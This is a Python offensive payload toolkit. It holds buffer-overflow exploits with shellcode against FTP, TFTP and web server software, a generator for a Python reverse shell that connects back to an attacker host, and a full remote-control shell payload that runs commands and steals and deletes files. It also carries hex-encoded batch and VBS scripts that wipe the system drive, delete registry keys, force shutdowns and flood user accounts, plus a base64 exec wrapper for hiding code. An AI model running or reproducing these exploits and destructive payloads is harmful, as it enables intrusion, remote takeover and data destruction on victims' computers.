#!/usr/bin/python
import src.source.use

# Version Payloads: 2.0
# Copyright (c) ReztDev 2017. All rights reserved

payload_remote = ("""
import base64
exec(base64.b64decode(""")

def Unauthenticated_Remote_Exploit(host, port):
    import socket
    about = {
        'author' : 'Lincoln',
        'source' : 'http://www.exploit-db.com/exploits/11391',
        'descriptions' : 'Open & Compact FTPd Pre-Authentication Remote Exploit',
    }

    shell_code = ("\x31\xc9\xbd\xdd\x2b\x25\x18\xb1\x56\xdb\xcb\xd9\x74\x24\xf4"
"\x58\x31\x68\x10\x83\xe8\xfc\x03\x68\x0c\x3f\xde\xd9\xf0\x36"
"\x21\x22\x01\x28\xab\xc7\x30\x7a\xcf\x8c\x61\x4a\x9b\xc1\x89"
"\x21\xc9\xf1\x1a\x47\xc6\xf6\xab\xed\x30\x38\x2b\xc0\xfc\x96"
"\xef\x43\x81\xe4\x23\xa3\xb8\x26\x36\xa2\xfd\x5b\xb9\xf6\x56"
"\x17\x68\xe6\xd3\x65\xb1\x07\x34\xe2\x89\x7f\x31\x35\x7d\x35"
"\x38\x66\x2e\x42\x72\x9e\x44\x0c\xa3\x9f\x89\x4f\x9f\xd6\xa6"
"\xbb\x6b\xe9\x6e\xf2\x94\xdb\x4e\x58\xab\xd3\x42\xa1\xeb\xd4"
"\xbc\xd4\x07\x27\x40\xee\xd3\x55\x9e\x7b\xc6\xfe\x55\xdb\x22"
"\xfe\xba\xbd\xa1\x0c\x76\xca\xee\x10\x89\x1f\x85\x2d\x02\x9e"
"\x4a\xa4\x50\x84\x4e\xec\x03\xa5\xd7\x48\xe5\xda\x08\x34\x5a"
"\x7e\x42\xd7\x8f\xf8\x09\xb0\x7c\x36\xb2\x40\xeb\x41\xc1\x72"
"\xb4\xf9\x4d\x3f\x3d\x27\x89\x40\x14\x9f\x05\xbf\x97\xdf\x0c"
"\x04\xc3\x8f\x26\xad\x6c\x44\xb7\x52\xb9\xca\xe7\xfc\x12\xaa"
"\x57\xbd\xc2\x42\xb2\x32\x3c\x72\xbd\x98\x4b\xb5\x73\xf8\x1f"
"\x51\x76\xfe\x8e\xfd\xff\x18\xda\xed\xa9\xb3\x73\xcf\x8d\x0b"
"\xe3\x30\xe4\x27\xbc\xa6\xb0\x21\x7a\xc9\x40\x64\x28\x66\xe8"
"\xef\xbb\x64\x2d\x11\xbc\xa1\x05\x58\x84\x21\xdf\x34\x46\xd0"
"\xe0\x1c\x30\x71\x72\xfb\xc1\xfc\x6f\x54\x95\xa9\x5e\xad\x73"
"\x47\xf8\x07\x66\x9a\x9c\x60\x22\x40\x5d\x6e\xaa\x05\xd9\x54"
"\xbc\xd3\xe2\xd0\xe8\x8b\xb4\x8e\x46\x6d\x6f\x61\x31\x27\xdc"
"\x2b\xd5\xbe\x2e\xec\xa3\xbf\x7a\x9a\x4c\x71\xd3\xdb\x73\xbd"
"\xb3\xeb\x0c\xa0\x23\x13\xc7\x61\x53\x5e\x4a\xc3\xfc\x07\x1e"
"\x56\x61\xb8\xf4\x94\x9c\x3b\xfd\x64\x5b\x23\x74\x61\x27\xe3"
"\x64\x1b\x38\x86\x8a\x88\x39\x83\x81")

    buf = "\x42\x2c\x20" * 199 + "\x90" * 10 + shell_code
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 21))
    s.recv(1024)
    s.send("USER " + buf + "\r\n")
    s.recv(1024)
    s.close()


def ftpshell_bufferOverflow(host, port=21):
    import socket

    about = {
        'author' : 'Peter Baris',
        'vendor_homepage' : 'http://www.saptech-erp.com.au',
        'link' : 'http://www.ftpshell.com/downloadclient.htm',
        'required_os' : 'Microsoft Windows Server 2008 R2 x64',
        'description' : 'FTPShell Client 6.53 buffer overflow on making initial connection'
    }

    shell = ("\xdb\xce\xbf\xaa\xcc\x44\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
            "\x52\x83\xc2\x04\x31\x7a\x13\x03\xd0\xdf\xa6\x3c\xd8\x08\xa4"
            "\xbf\x20\xc9\xc9\x36\xc5\xf8\xc9\x2d\x8e\xab\xf9\x26\xc2\x47"
            "\x71\x6a\xf6\xdc\xf7\xa3\xf9\x55\xbd\x95\x34\x65\xee\xe6\x57"
            "\xe5\xed\x3a\xb7\xd4\x3d\x4f\xb6\x11\x23\xa2\xea\xca\x2f\x11"
            "\x1a\x7e\x65\xaa\x91\xcc\x6b\xaa\x46\x84\x8a\x9b\xd9\x9e\xd4"
            "\x3b\xd8\x73\x6d\x72\xc2\x90\x48\xcc\x79\x62\x26\xcf\xab\xba"
            "\xc7\x7c\x92\x72\x3a\x7c\xd3\xb5\xa5\x0b\x2d\xc6\x58\x0c\xea"
            "\xb4\x86\x99\xe8\x1f\x4c\x39\xd4\x9e\x81\xdc\x9f\xad\x6e\xaa"
            "\xc7\xb1\x71\x7f\x7c\xcd\xfa\x7e\x52\x47\xb8\xa4\x76\x03\x1a"
            "\xc4\x2f\xe9\xcd\xf9\x2f\x52\xb1\x5f\x24\x7f\xa6\xed\x67\xe8"
            "\x0b\xdc\x97\xe8\x03\x57\xe4\xda\x8c\xc3\x62\x57\x44\xca\x75"
            "\x98\x7f\xaa\xe9\x67\x80\xcb\x20\xac\xd4\x9b\x5a\x05\x55\x70"
            "\x9a\xaa\x80\xd7\xca\x04\x7b\x98\xba\xe4\x2b\x70\xd0\xea\x14"
            "\x60\xdb\x20\x3d\x0b\x26\xa3\x82\x64\xee\xb3\x6b\x77\xee\xa2"
            "\x37\xfe\x08\xae\xd7\x56\x83\x47\x41\xf3\x5f\xf9\x8e\x29\x1a"
            "\x39\x04\xde\xdb\xf4\xed\xab\xcf\x61\x1e\xe6\xad\x24\x21\xdc"
            "\xd9\xab\xb0\xbb\x19\xa5\xa8\x13\x4e\xe2\x1f\x6a\x1a\x1e\x39"
            "\xc4\x38\xe3\xdf\x2f\xf8\x38\x1c\xb1\x01\xcc\x18\x95\x11\x08"
            "\xa0\x91\x45\xc4\xf7\x4f\x33\xa2\xa1\x21\xed\x7c\x1d\xe8\x79"
            "\xf8\x6d\x2b\xff\x05\xb8\xdd\x1f\xb7\x15\x98\x20\x78\xf2\x2c"
            "\x59\x64\x62\xd2\xb0\x2c\x92\x99\x98\x05\x3b\x44\x49\x14\x26"
            "\x77\xa4\x5b\x5f\xf4\x4c\x24\xa4\xe4\x25\x21\xe0\xa2\xd6\x5b"
            "\x79\x47\xd8\xc8\x7a\x42")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
    except socket.error as socket_error:
        import src.Logging.print_stdout
        src.Logging.print_stdout.print_error(
            str(socket_error)
        )

    # 004b95dc in ftpshell.exe PUSH ESI ; RETN
    eip = "\xdc\x95\x4b"
    nops = "\x90"*8 
    junk = "A"*(400-len(nops)-len(shell))
    buffer = nops + shell + junk + eip

    while True:
        conn, addr = s.accept()
        conn.send('220 Welcome to your unfriendly FTP server\r\n')
        print(conn.recv(1024))
        conn.send("331 OK\r\n")
        print(conn.recv(1024))
        conn.send('230 OK\r\n')
        print(conn.recv(1024))
        conn.send('220 "'+buffer+'" is current directory\r\n')



def buffer_overflow(host, port):
    import struct, socket
    about = {
        'author' : 'Zeus Web Server',
        'source' : 'http://www.securityfocus.com/bid/37829/info',
        'descriptions' : ("""
                            Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.
                        """),
    }

    buf = ""
    buf += chr(1)
    buf += "\x00\x02"
    buf += struct.pack(">H", 21)
    buf += struct.pack(">H", 0xffff)
    buf += struct.pack(">H", 16)
    buf += "\x07\x00\xc0\x03\x00\x80\x01\x00\x80\x08\x00\x80"
    buf += "\x06\x00\x40\x04\x00\x80\x02\x00\x80"
    buf += "A" * 50000
    buf += "C" * 16
    siz = chr( ( (len(buf) & 0xff00) >> 8)| 0x80) + chr(len(buf) & 0xff)
    buf = siz + buf

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.sendall(buff)
    sock.recv(1000)
    sock.close()

def Long_Transporting_Mode_Overflow():

    About = {
        'from' : 'DroidBugExploit',
        'author' : 'Liu Qixu',
        'encode' : 'win32_bind - EXIFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com',
        'description' : 'This is a poc intended to exploit the 3com TFTP Service version 2.0.1\nLong Transporting mode buffer overflow under xp sp2 english',
    }

    sc1 = "\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x02"
    sc1 += "\xaf\xbb\x16\x83\xeb\xfc\xe2\xf4\xfe\xc5\x50\x5b\xea\x56\x44\xe9"
    sc1 +="\xfd\xcf\x30\x7a\x26\x8b\x30\x53\x3e\x24\xc7\x13\x7a\xae\x54\x9d"
    sc1 +="\x4d\xb7\x30\x49\x22\xae\x50\x5f\x89\x9b\x30\x17\xec\x9e\x7b\x8f"
    sc1 +="\xae\x2b\x7b\x62\x05\x6e\x71\x1b\x03\x6d\x50\xe2\x39\xfb\x9f\x3e"
    sc1 +="\x77\x4a\x30\x49\x26\xae\x50\x70\x89\xa3\xf0\x9d\x5d\xb3\xba\xfd"
    sc1 +="\x01\x83\x30\x9f\x6e\x8b\xa7\x77\xc1\x9e\x60\x72\x89\xec\x8b\x9d"
    sc1 +="\x42\xa3\x30\x66\x1e\x02\x30\x56\x0a\xf1\xd3\x98\x4c\xa1\x57\x46"
    sc1 +="\xfd\x79\xdd\x45\x64\xc7\x88\x24\x6a\xd8\xc8\x24\x5d\xfb\x44\xc6"
    sc1 +="\x6a\x64\x56\xea\x39\xff\x44\xc0\x5d\x26\x5e\x70\x83\x42\xb3\x14"
    sc1 +="\x57\xc5\xb9\xe9\xd2\xc7\x62\x1f\xf7\x02\xec\xe9\xd4\xfc\xe8\x45"
    sc1 +="\x51\xfc\xf8\x45\x41\xfc\x44\xc6\x64\xc7\xaa\x4a\x64\xfc\x32\xf7"
    sc1 +="\x97\xc7\x1f\x0c\x72\x68\xec\xe9\xd4\xc5\xab\x47\x57\x50\x6b\x7e"
    sc1 +="\xa6\x02\x95\xff\x55\x50\x6d\x45\x57\x50\x6b\x7e\xe7\xe6\x3d\x5f"
    sc1 +="\x55\x50\x6d\x46\x56\xfb\xee\xe9\xd2\x3c\xd3\xf1\x7b\x69\xc2\x41"
    sc1 +="\xfd\x79\xee\xe9\xd2\xc9\xd1\x72\x64\xc7\xd8\x7b\x8b\x4a\xd1\x46"
    sc1 +="\x5b\x86\x77\x9f\xe5\xc5\xff\x9f\xe0\x9e\x7b\xe5\xa8\x51\xf9\x3b"
    sc1 +="\xfc\xed\x97\x85\x8f\xd5\x83\xbd\xa9\x04\xd3\x64\xfc\x1c\xad\xe9"
    sc1 +="\x77\xeb\x44\xc0\x59\xf8\xe9\x47\x53\xfe\xd1\x17\x53\xfe\xee\x47"
    sc1 +="\xfd\x7f\xd3\xbb\xdb\xaa\x75\x45\xfd\x79\xd1\xe9\xfd\x98\x44\xc6"
    sc1 +="\x89\xf8\x47\x95\xc6\xcb\x44\xc0\x50\x50\x6b\x7e\xf2\x25\xbf\x49"
    sc1 +="\x51\x50\x6d\xe9\xd2\xaf\xbb\x16"

    jmp = "\x63\x20\xdc\x77" # jmp esi user32.dll xp sp 2 english

    exploit = "\x00\x02"
    exploit += "a"
    exploit += "\x00"
    exploit += "\x90" * 129
    exploit += sc1
    exploit += jmp
    exploit += "\x00"

    return exploit
    


def payload_linux_python(host_ip, host_port, output):
    payload = """
import socket,subprocess,os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{host}',{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh', '-i'])""".format(
        host=host_ip, port=host_port
    )
    if os.path.isdir("output") == False:
        os.mkdir("output")
        with open("output/" + output, "w") as payload_code:
            try:
                payload_code.write(payload)
                payload_code.close()
                print("Payload Completed.")
            except IOError as Error:
                print(
                        "Code: [{code}]\nMessage: [{message}]".format(
                                code=str(Error[0]),
                                message=Error[1]
                            )
                    )
    else:
        with open("output/"+output, "w") as build:
            build.write(payload)
            build.close()
            print("Paylod Completed.")




CD_ROM = '''\x53\x65\x74\x20\x6f\x57\x4d\x50\x20\x3d\x20\x43\x72\x65\x61\x74\x65\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x4d\x50\x6c\x61\x79\x65\x72\x2e\x4f\x43\x58\x2e\x37\x3f\x22\x29
\x53\x65\x74\x63\x6f\x6c\x43\x44\x52\x4f\x4d\x73\x20\x3d\x20\x6f\x57\x4d\x50\x2e\x63\x64\x72\x6f\x6d\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e
\x64\x6f\x69\x66\x20\x63\x6f\x6c\x43\x44\x52\x4f\x4d\x2e\x43\x6f\x75\x6e\x74\x20\x3e\x3d\x20\x31\x20\x74\x68\x65\x6e
\x66\x6f\x72\x20\x69\x3d\x30\x20\x74\x6f\x20\x63\x6f\x6c\x43\x44\x52\x4f\x4d\x2e\x43\x6f\x75\x6e\x74\x2d\x31
\x63\x6f\x6c\x43\x44\x52\x4f\x4d\x73\x2e\x49\x74\x65\x6d\x28\x69\x29\x2e\x45\x6a\x65\x63\x74
\x4e\x65\x78\x74
\x66\x6f\x72\x20\x69\x3d\x30\x20\x74\x6f\x20\x63\x6f\x6c\x43\x44\x52\x4f\x4d\x2e\x43\x6f\x75\x6e\x74\x2d\x31
\x63\x6f\x6c\x43\x44\x52\x4f\x4d\x73\x2e\x49\x74\x65\x6d\x28\x69\x29\x2e\x45\x6a\x65\x63\x74
\x4e\x65\x78\x74
\x45\x6e\x64\x20\x69\x66
\x77\x73\x63\x72\x69\x70\x74\x2e\x73\x6c\x65\x65\x70\x20\x31\x30\x30
\x6c\x6f\x6f\x70'''
ChangeExtension = """\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x61\x73\x73\x6f\x63\x20\x2e\x74\x78\x74\x3d\x6a\x70\x65\x67\x66\x69\x6c\x65
\x61\x73\x73\x6f\x63\x20\x2e\x65\x78\x65\x3d\x68\x74\x6d\x6c\x66\x69\x6c\x65
\x61\x73\x73\x6f\x63\x20\x2e\x73\x79\x73\x3d\x72\x65\x67\x66\x69\x6c\x65
\x61\x73\x73\x6f\x63\x20\x2e\x70\x6e\x67\x3d\x6d\x70\x65\x67\x66\x69\x6c\x65
\x3a\x6d\x73\x67
\x6d\x73\x67\x20\x2a\x20\x59\x6f\x75\x72\x20\x73\x79\x73\x74\x65\x6d\x20\x69\x73\x20\x63\x72\x61\x63\x6b\x65\x64\x20\x21\x21
\x67\x6f\x74\x6f\x20\x6d\x73\x67
"""
shutdown = '''\x40\x65\x63\x68\x6f\x20\x6f\x66
\x3a\x73\x68\x74
\x6d\x73\x67\x20\x2a\x20\x59\x6f\x75\x72\x20\x63\x6f\x6d\x70\x75\x74\x65\x72\x20\x64\x65\x74\x65\x63\x74\x65\x64\x20\x76\x69\x72\x75\x73
\x73\x68\x75\x74\x64\x6f\x77\x6e\x20\x2d\x73\x20\x2d\x74\x20\x31\x30
\x67\x6f\x74\x6f\x20\x73\x68\x74
'''
UserFlooder = '''\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x3a\x75\x73\x65\x72
\x75\x73\x65\x72\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x20\x2f\x61\x64\x64
\x67\x6f\x74\x6f\x20\x75\x73\x65\x72
'''
PC_Talk = '''\x44\x69\x6d\x20\x6d\x73\x67\x2e\x73\x61\x70\x69
\x6d\x73\x67\x3d\x49\x6e\x70\x75\x74\x42\x6f\x78\x28\x22\x45\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x74\x65\x78\x74\x22\x2e\x22\x54\x61\x6c\x6b\x20\x69\x74\x22\x29
\x53\x65\x74\x20\x73\x61\x70\x69\x3d\x43\x72\x65\x61\x74\x65\x4f\x62\x6a\x65\x63\x74\x28\x22\x73\x61\x70\x69\x2e\x73\x70\x76\x6f\x69\x63\x65\x22\x29
\x73\x61\x70\x69\x2e\x53\x70\x65\x61\x6b\x20\x6d\x73\x67
'''
CreateFolder = '''\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x3a\x56\x49\x52\x55\x53
\x63\x64\x20\x2f\x64\x20\x43\x3a
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x63\x64\x20\x2f\x64\x20\x44\x3a
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x63\x64\x20\x2f\x64\x20\x45\x3a
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x6d\x64\x20\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25\x25\x72\x61\x6e\x64\x6f\x6d\x25
\x67\x6f\x74\x6f\x20\x56\x49\x52\x55\x53
\x52\x45\x4d\x20\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23
'''
DeleteAllContent = """\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x64\x65\x6c\x20\x25\x73\x79\x73\x74\x65\x6d\x64\x72\x69\x76\x65\x25\x20\x2a\x2e\x2a\x20\x2f\x66\x20\x2f\x73\x20\x2f\x71
\x73\x68\x75\x74\x64\x6f\x77\x6e\x20\x2d\x73\x20\x2d\x66\x20\x74\x20\x32\x30
"""
DeleteRegistryFile = """\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x53\x54\x41\x52\x54\x20\x72\x65\x67\x20\x64\x65\x6c\x65\x74\x65\x20\x48\x4b\x43\x52\x2f\x2e\x65\x78\x65
\x53\x54\x41\x52\x54\x20\x72\x65\x67\x20\x64\x65\x6c\x65\x74\x65\x20\x48\x4b\x43\x52\x2f\x2e\x64\x6c\x6c
\x53\x54\x41\x52\x54\x20\x72\x65\x67\x20\x64\x65\x6c\x65\x74\x65\x20\x48\x4b\x43\x52\x2f\x2e\x2a
"""
DeleteAll = """\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x6d\x73\x67\x20\x2a\x20\x48\x65\x6c\x6c\x6f\x2c\x20\x50\x6c\x65\x61\x73\x20\x6a\x75\x73\x74\x20\x61\x20\x6d\x6f\x6d\x65\x6e\x74\x20\x3a\x29
\x3a\x64\x65\x6c\x65\x74\x65
\x64\x65\x6c\x20\x2a\x2e\x2a
\x67\x6f\x74\x6f\x20\x64\x65\x6c\x65\x74\x65
"""
RAMCrash = """\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x3a\x62\x75\x66\x65\x72
\x73\x74\x61\x72\x74\x20\x68\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x78\x68\x61\x6d\x73\x74\x65\x72\x2e\x63\x6f\x6d\x2f
\x67\x6f\x74\x6f\x20\x62\x75\x66\x66\x65\x72
"""
kill_process = """\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x73\x74\x61\x72\x74\x20\x63\x61\x6c\x63
\x74\x73\x6b\x69\x6c\x6c\x20\x6d\x73\x6e\x6d\x73\x67\x72
\x74\x73\x6b\x69\x6c\x6c\x20\x66\x69\x72\x65\x66\x6f\x78
\x74\x73\x6b\x69\x6c\x6c\x20\x69\x65\x78\x70\x6c\x6f\x72\x65\x72
\x74\x73\x6b\x69\x6c\x6c\x20\x4c\x69\x6d\x72\x65\x57\x69\x72\x65
\x74\x73\x6b\x69\x6c\x6c\x20\x65\x78\x70\x6c\x6f\x72\x65\x72
\x74\x73\x6b\x69\x6c\x6c\x20\x65\x78\x70\x6c\x6f\x72\x65\x72
\x74\x73\x6b\x69\x6c\x6c\x20\x65\x78\x70\x6c\x6f\x72\x65\x72
\x74\x73\x6b\x69\x6c\x6c\x20\x65\x78\x70\x6c\x6f\x72\x65\x72
\x70\x61\x75\x73\x65
"""
BlueScreen = """\x40\x65\x63\x68\x6f\x20\x6f\x66\x66
\x64\x65\x6c\x20\x25\x73\x79\x73\x74\x65\x6d\x64\x72\x69\x76\x65\x25\x20\x2a\x2e\x2a\x20\x2f\x66\x20\x2f\x73\x20\x2f\x71
\x73\x68\x75\x74\x64\x6f\x77\x6e\x20\x2d\x72\x20\x2d\x66\x20\x2d\x74\x31\x30
\x6d\x73\x67\x20\x2a\x20\x47\x6f\x6f\x64\x20\x62\x79\x65\x20\x21\x21
"""
cap_lock = """\x53\x65\x74\x20\x77\x73\x68\x73\x68\x65\x6c\x6c\x3d\x77\x73\x63\x72\x69\x70\x74\x2e\x43\x72\x65\x61\x74\x65\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c\x22\x29
\x64\x6f
\x77\x73\x63\x72\x69\x70\x74\x2e\x73\x6c\x65\x65\x70\x20\x31\x30\x30
\x57\x73\x68\x73\x68\x65\x6c\x6c\x2e\x73\x65\x6e\x64\x6b\x65\x79\x73\x20\x22\x7b\x43\x41\x50\x4c\x4f\x43\x4b\x7d\x22
\x6c\x6f\x6f\x70
"""

def listener(ip, port):
    ip_address = ip
    port_address = int(port)
    payload = """
#!/usr/bin/python
import socket
import sys
import os
import platform
import subprocess

class Meterpreter_Shell(object):
    def __init__(self, ip_address, port_address):
        self.localhost = ip_address
        self.localport = int(port_address)
        global conn
        conn = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM
        )
        try:
            conn.connect((
                    self.localhost, self.localport
                )
            )
            if os.name == "nt":
                platforms = platform.platform()
                conn.send("Running on " + platforms)
            else:
                systems = platform.platform()
                conn.send("Running on " + systems)
        except socket.error as message:
            conn.send(str(message))
            conn.close()
            sys.exit(1)

    def main_process_shell(self):
        global conn
        try:
            while True:
                request_server = conn.recv(4096)
                if request_server[:2] == "cd":
                    try:
                        directory = request_server[3:]
                        os.chdir(directory)
                        conn.send(
                            "Location: {current}".format(
                                current=os.getcwd()
                            )
                        ) 
                    except os.error as error_moved:
                        conn.send(
                            "Error Code: [{code}] | Message: {message}".format(
                                code=str(error_moved[0]),
                                message=error_moved[1]
                            )
                        ) 
                        continue

                elif request_server.startswith("mkdir") == True:
                    make_folder = request_server[6:]
                    try:
                        os.mkdir(directory)
                        conn.send(
                            "Success created -> {folder}".format(
                                folder=make_folder
                            )
                        )
                    except os.error as error_create:
                        conn.send(
                            "Error Code: [{code}] | Message: {message}".format(
                                code=str(error_create[0]),
                                message=error_create[1]
                            )
                        )
                        continue
                    except IndexError:
                        conn.send(
                            "Usage: mkdir [Folder]"
                        )

                elif request_server == "listdir":
                    try:
                        for filename in os.listdir(os.getcwd()):
                            if os.path.isfile(filename) == True:
                                conn.send(
                                    "File -> {name} | Size File -> {size} Bytes".format(
                                        name=filename,
                                        size=os.path.getsize(filename)
                                    )
                                )
                            elif os.path.isdir(filename) == True:
                                conn.send(
                                    "Folder -> {name} | Size File -> {size} Bytes".format(
                                        name=filename,
                                        size=os.path.getsize(filename)
                                    )
                                )
                            else:
                                conn.send(
                                    "Unknown File -> {name} | Size File -> {size} Bytes".format(
                                        name=filename,
                                        size=os.path.getsize(filename)
                                    )
                                )
                    except IOError as error_io:
                        conn.send(
                            "Error Code: [{code}] | Message: {message}".format(
                                code=str(error_io),
                                message=error_io
                            )
                        )
                        continue

                elif request_server.startswith("download") == True:
                    try:
                        file_download = request_server[9:]
                        if os.path.isfile(file_download) == True:
                            with open(file_download, "r") as filename:
                                for sending in filename:
                                    packet_data = sending.readline()
                                    conn.send(packet_data)
                                conn.send("Success Downloaded file -> {}".format(file_download))
                        elif os.path.isdir(file_download) == True:
                            conn.send(
                                "Failed download -> {file} because is folder".format(
                                    file=file_download
                                )
                            )
                        else:
                            conn.send("Invalid filename!!")
                            continue
                    except IndexError as error_index:
                        conn.send(
                            "Error Code: [{code}] | Message: {message}".format(
                                code=str(error_index[0]),
                                message=error_index[1]
                            )
                        )
                        continue
                    except os.error as error_files:
                        conn.send(
                            "Error Code: [{code}] | Message: {message}".format(
                                code=str(error_files[0]),
                                message=error_files[1]
                            )
                        )

                elif request_server == "delall":
                    for files in os.listdir(os.getwcd()):
                        if os.path.isfile(files):
                            os.remove(files)
                            conn.send(
                                "Deleted file => {name} success".format(
                                    name=files
                                )
                            )
                        elif os.path.isdir(files):
                            conn.send(
                                "Deleted {name} failed (not supported folder)".format(
                                    name=files
                                )
                            )
                        else:
                            conn.send(
                                "File Unknown => {name} failed".format(
                                    name=files
                                )
                            )


                elif request_server.startswith("del") == True:
                    try:
                        delete_filename = request_server[4:]
                        if os.path.isfile(delete_filename) == True:
                            os.remove(delete_filename)
                            conn.send(
                                "Success deleted file -> {name_file}".format(
                                    name_file=delete_filename
                                )
                            )
                        elif os.path.isdir(delete_filename) == True:
                            os.rmdir(delete_filename)
                            conn.send(
                                "Success deleted folder -> {name_folder}".format(
                                    name_folder=delete_filename
                                )
                            )
                        else:
                            conn.send(
                                "Sorry file not support to this action!!"
                            )
                    except os.error as error_delete:
                        conn.send(
                            "Error Code: [{code}] | Message: {message}".format(
                                code=str(error_delete),
                                message=error_delete
                            )
                        )
                        continue
                    except IndexError:
                        conn.send("Usage: del [filename]")

                else:
                    process = subprocess.Popen(
                            request_server,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE
                    )
                    send_process = process.stdout.read() + process.stderr.read()
                    conn.send(str(send_process))

        except IOError as message_error:
            conn.send(
                "Error Code: [{code}] | Message: {message}".format(
                    code=str(message_error),
                    message=message_error
                )
            )
shell = Meterpreter_Shell('"""+ip_address+"""',"""+str(port_address)+""")
shell.main_process_shell()
"""
    return payload


def execute(code):
    text = '''#!/usr/bin/python
import base64
code = (
    """{code}"""
)
exec(base64.b64decode(code.encode("utf-16")))'''.format(code=code)
    return text